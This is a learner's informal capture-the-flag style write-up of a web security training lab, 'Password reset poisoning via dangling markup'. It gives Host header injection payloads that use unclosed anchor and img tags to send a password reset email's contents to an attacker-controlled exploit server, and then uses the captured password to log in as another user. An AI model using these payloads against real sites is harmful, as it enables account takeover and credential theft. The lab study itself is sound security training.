@@ -1,0 +1,80 @@
+LAB INFO: Password reset poisoning via dangling markup
+
+SO LET'S KNOW FIRST ABOUT A DANGLING MARKUP: It's a technique for capturing the data cross domain where full xss is not possible.
+suppose there is attacker controllabe data into the response then:
+<input type="text" name="input" value="CONTROLLABLE DATA HERE"
+suppose if the application doesnot filter the character > and "> then attacker can inject the html code their
+like: 
+"><img src='//attacker_controlled_site?
+
+The lab working system is:
+LAB: Password reset poisoning via dangling markup
+
+when I do forget pass: it gives me email like this:
+<p>Hello!</p><p>Please <a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-academy.net/login'>click here</a> to login with your new password: 283F291cTw</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
+
+It directly shows password in the email --> This is one big red flag
+And at this point our host is like:
+Host: 0ace009c04d9448d8036035a00fd00b1.web-security-academy.net
+Let's change it into the:
+Host: 0ace009c04d9448d8036035a00fd00b1.web-security-academy.net:1234 --> and see how it reacts
+yes it does gives me email like this:
+<p>Hello!</p><p>Please <a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-academy.net:1234/login'>click here</a> to login with your new password: ZGy7k2VXd0</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
+And also notice that it comes with a different password.
+:1234 --> means we are able to add a colon and we are able to add a string after that colon this is a good sign
+# The colon and our port is successfully reflected there, may be we can do xss let's try:
+
+## Trying to make a payload:
+1. <a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-     	academy.net:<our_payload_here>/login'>click here</a>
+2. <a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-academy.net:'><a href='https://exploit-0af00088045944c48006020f01a600cb.exploit-server.net/login'>click here</a>  
+3. My payload here is: '><a href='https://exploit-0af00088045944c48006020f01a600cb.exploit-server.net ==> just trying not confirm that this will solve
+
+it gives me 200OK LET'S CHECK A MAIL NOW:
+<p>Hello!</p><p>Please <a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-academy.net:'><a href='https://exploit-0af00088045944c48006020f01a600cb.exploit-server.net/login'>click here</a> to login with your new password: JpQfjxu6eX</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i> --> It shows like this
+yeah in access log I got a response from 10.0.4.68       2025-05-17 06:31:47 +0000 "GET /login HTTP/1.1" 404 --> This is a different ip so surely this is our exploit server ip --> It does look like we attempted to go to the /login page --> It shows 404 because there is no login page on that sever
+
+NOW HERE COMES THE ROLE OF DANGLING MARKUP???
+1. so till now we confirm that we can add our exploit server and from there get the security service to visit that link
+2. so what we gonna do is???
+     2.1 We just don't wannna click on the any random link i wanna use a danling markup as such a way that it will include that entire text of the email in access log when it clicks the link
+     2.2 so how we gonna do it??
+         2.2.1 we can add that entire text as query{using the ? question mark}
+         2.2.2 Everything after the question mark is the query given to the link
+         2.2.3 now the whole idea is when the security service clicks the link of the user to verify email it also include the password of the user
+         2.2.4
+My payload: 
+
+<a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-     	academy.net:<our_payload_here>/login'>click here</a>
+2. <a href='https://0ace009c04d9448d8036035a00fd00b1.web-security-academy.net:'><a href='https://exploit-0af00088045944c48006020f01a600cb.exploit-server.net/?login'>click here</a>      --> added ? here to view it as  a query after that 
+In view access field it gives me response like: 
+10.0.4.68       2025-05-17 06:45:18 +0000 "GET /?/login HTTP/1.1" 200 
+viewing the access log we got to know that it's not clicking on the link hai, so may be there is a problem in our payload let's find it
+
+so in href="" ==> just remove the https: include only // which is the protocol is relative means if it loaded over https it will load https if over http then it will load over http
+this even don't give access so let's use double quote instead of single quote: in href field so the payload looks like:
+
+
+'><a href="https://exploit-0af00088045944c48006020f01a600cb.exploit-server.net/?login">
+'><a href="https://exploit-0af00088045944c48006020f01a600cb.exploit-server.net/? --> This is the payload we use
+
+
+ok it shows email like this: 
+2025-05-17 06:54:12 +0000	wiener@exploit-0af00088045944c48006020f01a600cb.exploit-server.net	no-reply@0ace009c04d9448d8036035a00fd00b1.web-security-academy.net	Account recovery	
+
+Hello!
+
+Please 
+
+and now let's go back to our access log to see what happens
+
+/?/login'>click+here</a>+to+login+with+your+new+password:+rCTpjp2AQC</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i>   --> This is what is shows it treats everything as string after ?
+
+now we got a working exploit now what we do is?
+   change the username to carlos
+   as we don't have access to carlos email however the security service will click the link and it shows the password
+   GET /?/login'>click+here</a>+to+login+with+your+new+password:+m6HjWed2uL</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> --> This is of carlos 
+   so the password is: m6HjWed2uL
+   let's login as the carlos now
+   
+   
+   Finlly we solve the lab.
